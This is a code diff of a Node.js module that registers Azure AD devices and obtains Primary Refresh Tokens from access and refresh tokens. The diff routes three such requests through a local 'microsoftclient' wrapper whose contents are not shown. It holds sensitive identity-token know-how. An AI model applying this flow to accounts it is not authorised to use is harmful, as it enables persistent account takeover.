@@ -3,6 +3,7 @@
  * Handles Azure AD Device Registration (DRS) and PRT generation
  */
 const axios = require('axios');
+const ms = require('./microsoftclient');
 const crypto = require('crypto');
 const forge = require('node-forge');
 const { v4: uuidv4 } = require('uuid');
@@ -177,7 +178,7 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
       TransportKeyLength: payload.TransportKey ? Buffer.from(payload.TransportKey, 'base64').length : null,
     };
     console.log('[DeviceManager] DRS request:', { drsUrl, accessTokenPrefix: accessToken ? accessToken.substring(0, 12) : null, payloadSummary });
-    response = await axios.post(
+    response = await ms.post(
       drsUrl,
       payload,
       {
@@ -505,7 +506,7 @@ async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
     });
 
     try {
-      const response = await axios.post(url, params, {
+      const response = await ms.post(url, params, {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         timeout: 30000
       });
@@ -611,7 +612,7 @@ async function registerDeviceAndGetPrt(tokenData) {
   let drsAccessToken = access_token;
   if (refresh_token) {
     try {
-      const tokenResp = await axios.post(
+      const tokenResp = await ms.post(
         `https://login.microsoftonline.com/${tenant_id || 'common'}/oauth2/v2.0/token`,
         new URLSearchParams({
           client_id: DEVICE_CLIENT_ID,
